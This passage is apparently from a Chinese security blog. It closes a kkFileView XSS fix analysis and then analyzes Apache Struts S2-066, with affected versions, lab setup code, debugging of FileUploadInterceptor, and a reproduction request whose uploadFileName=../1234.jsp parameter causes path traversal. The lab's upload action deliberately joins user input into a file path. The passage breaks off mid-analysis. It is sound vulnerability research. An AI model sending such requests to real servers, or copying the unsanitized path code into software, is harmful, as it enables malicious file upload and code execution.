fileHandlerService.getRelativePath(response.getContent());</span><br><span class="line">            imgUrls.clear();</span><br><span class="line">            imgUrls.add(file);</span><br><span class="line">            model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">            model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> PICTURE_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就和前面差不多了，传入得url值不经过滤或其他处理的直接传入了模板中，导致了XSS缺陷</p><h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>v4.2.0中修复后&#x2F;picturesPreview的代码为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping( &quot;/picturesPreview&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">picturesPreview</span><span class="params">(String urls, Model model, HttpServletRequest req)</span> &#123;</span><br><span class="line">    String fileUrls;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileUrls = WebUtils.decodeUrl(urls);</span><br><span class="line">        <span class="comment">// 防止XSS攻击</span></span><br><span class="line">        fileUrls = KkFileUtils.htmlEscape(fileUrls);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> String.format(BASE64_DECODE_ERROR_MSG, <span class="string">&quot;urls&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, errorMsg);</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;预览文件url：&#123;&#125;，urls：&#123;&#125;&quot;</span>, fileUrls, urls);</span><br><span class="line">    <span class="comment">// 抽取文件并返回文件列表</span></span><br><span class="line">    String[] images = fileUrls.split(<span class="string">&quot;\\|&quot;</span>);</span><br><span class="line">    List&lt;String&gt; imgUrls = Arrays.asList(images);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;imgUrls&quot;</span>, imgUrls);</span><br><span class="line">    <span class="type">String</span> <span class="variable">currentUrl</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;currentUrl&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.hasText(currentUrl)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">decodedCurrentUrl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.decodeBase64(currentUrl));</span><br><span class="line">        decodedCurrentUrl = KkFileUtils.htmlEscape(decodedCurrentUrl);   <span class="comment">// 防止XSS攻击</span></span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, decodedCurrentUrl);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;currentUrl&quot;</span>, imgUrls.get(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> PICTURE_FILE_PREVIEW_PAGE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，对传入前端模板的参数都进行了HTML实体编码</p><p>&#x2F;onlinePreview处的修复如下</p><p><a href="https://github.com/kekingcn/kkFileView/commit/8c6f5bf807b492c71e04ce10fac9fa7d93dc1895#diff-fd65fb3fec861ad352ccc6b0962eabd6e8c5daaaa7939a19624199afd4e58e29R33">https://github.com/kekingcn/kkFileView/commit/8c6f5bf807b492c71e04ce10fac9fa7d93dc1895#diff-fd65fb3fec861ad352ccc6b0962eabd6e8c5daaaa7939a19624199afd4e58e29R33</a></p><p><img src="https://s2.loli.net/2024/12/20/wBcWzaO6NjnV57D.png" alt="img"></p><p>也是加入了HTML实体编码</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> kkFileView </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Struts S2-066 漏洞分析</title>
      <link href="/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2024/12/15/Apache%20Struts%20S2-066%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">Apache Struts2 文件上传分析(S2-066) - y4tacker</a></p><p><a href="https://xz.aliyun.com/t/13834">Struts2 S2-066漏洞浅析 - zh1z****</a></p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>Apache Struts 2是一个基于MVC设计模式的Web应用框架，可用于创建企业级Java web应用程序。</p><p>由于文件上传逻辑存在缺陷，威胁者可操纵文件上传参数导致路径遍历，某些情况下可能上传恶意文件，造成远程代码执行。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Struts 2.0.0 - Struts 2.3.37 (EOL)</p><p>Struts 2.5.0 - Struts 2.5.32</p><p>Struts 6.0.0 - Struts 6.3.0</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>和S2-067的环境搭建类似，这里Apache Struts 2漏洞版本选择6.3.0</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.struts<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>struts2-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>定义UploadAction类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.ph0ebus.s2066.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> File upload;</span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UploadAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(File upload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/tmp/s2066&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">realPath</span> <span class="operator">=</span> path + File.separator + <span class="built_in">this</span>.uploadFileName;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.upload, <span class="keyword">new</span> <span class="title class_">File</span>(realPath));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置struts.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;s2066&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cn.ph0ebus.s2066.action.UploadAction&quot;</span> <span class="attr">method</span>=<span class="string">&quot;doUpload&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action?uploadFileName=../1234.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p>使用这个数据包可将上传的文件名覆盖为1234.jsp，并且可以目录穿越</p><p><img src="https://s2.loli.net/2024/12/17/gCPzfkVAom7UlJb.png" alt="img"><img src="https://s2.loli.net/2024/12/17/xyFU5LptNdmTanh.png" alt="img"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>相关的commit在<a href="https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163">https://github.com/apache/struts/commit/162e29fee9136f4bfd9b2376da2cbf590f9ea163</a></p><p>根据这个测试类，可以看出这里和HTTP参数大小写敏感有关，根据函数名可以看出，在get参数时应该大小写敏感，而Append相同参数时忽略大小写</p><p>Struts2本身是有一系列默认拦截器，这部分配置在struts-default.xml中，其中就包含了一个与文件上传相关的拦截器<code>org.apache.struts2.interceptor.FileUploadInterceptor</code></p><p><img src="https://s2.loli.net/2024/12/17/AGKwEnZ4Oqd7Q5T.png" alt="img"></p><p>用一个正常的上传数据包调试</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">hello ph0ebus</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p>分析一下<code>org.apache.struts2.interceptor.FileUploadInterceptor#intercept</code>这里的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ActionContext</span> <span class="variable">ac</span> <span class="operator">=</span> invocation.getInvocationContext();</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ac.getServletRequest();</span><br><span class="line">    <span class="keyword">if</span> (!(request <span class="keyword">instanceof</span> MultiPartRequestWrapper)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">            <span class="type">ActionProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> invocation.getProxy();</span><br><span class="line">            LOG.debug(<span class="built_in">this</span>.getTextMessage(<span class="string">&quot;struts.messages.bypass.request&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;proxy.getNamespace(), proxy.getActionName()&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">ValidationAware</span> <span class="variable">validation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">action</span> <span class="operator">=</span> invocation.getAction();</span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">instanceof</span> ValidationAware) &#123;</span><br><span class="line">            validation = (ValidationAware)action;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">MultiPartRequestWrapper</span> <span class="variable">multiWrapper</span> <span class="operator">=</span> (MultiPartRequestWrapper)request;</span><br><span class="line">        <span class="keyword">if</span> (multiWrapper.hasErrors() &amp;&amp; validation != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">TextProvider</span> <span class="variable">textProvider</span> <span class="operator">=</span> <span class="built_in">this</span>.getTextProvider(action);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(LocalizedMessage error : multiWrapper.getErrors()) &#123;</span><br><span class="line">                String errorMessage;</span><br><span class="line">                <span class="keyword">if</span> (textProvider.hasKey(error.getTextKey())) &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(error.getTextKey(), Arrays.asList(error.getArgs()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(<span class="string">&quot;struts.messages.error.uploading&quot;</span>, error.getDefaultMessage());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                validation.addActionError(errorMessage);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">fileParameterNames</span> <span class="operator">=</span> multiWrapper.getFileParameterNames();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(fileParameterNames != <span class="literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">inputName</span> <span class="operator">=</span> (String)fileParameterNames.nextElement();</span><br><span class="line">            String[] contentType = multiWrapper.getContentTypes(inputName);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.isNonEmpty(contentType)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                    LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.content.type&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String[] fileName = multiWrapper.getFileNames(inputName);</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.isNonEmpty(fileName)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                        LOG.warn(<span class="built_in">this</span>.getTextMessage(action, <span class="string">&quot;struts.messages.invalid.file&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    UploadedFile[] files = multiWrapper.getFiles(inputName);</span><br><span class="line">                    <span class="keyword">if</span> (files != <span class="literal">null</span> &amp;&amp; files.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        List&lt;UploadedFile&gt; acceptedFiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedContentTypes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedFileNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>(files.length);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">contentTypeName</span> <span class="operator">=</span> inputName + <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">fileNameName</span> <span class="operator">=</span> inputName + <span class="string">&quot;FileName&quot;</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; files.length; ++index) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="built_in">this</span>.acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) &#123;</span><br><span class="line">                                acceptedFiles.add(files[index]);</span><br><span class="line">                                acceptedContentTypes.add(contentType[index]);</span><br><span class="line">                                acceptedFileNames.add(fileName[index]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!acceptedFiles.isEmpty()) &#123;</span><br><span class="line">                            Map&lt;String, Parameter&gt; newParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                            newParams.put(inputName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>[acceptedFiles.size()])));</span><br><span class="line">                            newParams.put(contentTypeName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedContentTypes.size()])));</span><br><span class="line">                            newParams.put(fileNameName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedFileNames.size()])));</span><br><span class="line">                            ac.getParameters().appendAll(newParams);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拦截器首先获取了<code>ActionContext</code>上下文，然后从上下文中获取<code>HttpServletRequest</code>对象，然后从<code>HttpServletRequest</code>对象中获取文件上传的各个参数。</p><blockquote><p>[File Name] : File - the actual File</p><p>[File Name]ContentType : String - the content type of the file</p><p>[File Name]FileName : String - the actual name of the file uploaded (not the HTML name)</p></blockquote><p>遍历解析每个文件的参数（这里只有一个文件），如果通过<code>acceptFile()</code>方法则将参数塞进<code>org.apache.struts2.dispatcher.HttpParameters#parameters</code>属性中。完成后调用下一个拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!acceptedFiles.isEmpty()) &#123;</span><br><span class="line">    Map&lt;String, Parameter&gt; newParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    newParams.put(inputName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>[acceptedFiles.size()])));</span><br><span class="line">    newParams.put(contentTypeName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedContentTypes.size()])));</span><br><span class="line">    newParams.put(fileNameName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedFileNames.size()])));</span><br><span class="line">    ac.getParameters().appendAll(newParams);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试跟踪到<code>ac.getParameters().appendAll(newParams);</code>这段代码可以发现端倪.这里将文件上传的参数保存到了<code>org.apache.struts2.dispatcher.HttpParameters</code>对象当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">appendAll</span><span class="params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.parameters.putAll(newParams);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然是<code>HttpParameters#appendAll</code>，结合commit可以看出，这里修改后的代码会忽略大小写，那么漏洞代码则不会忽略大小写，所以可能存在某些变量覆盖的问题</p><p><img src="https://s2.loli.net/2024/12/17/oUBkWsQHCFOVgAN.png" 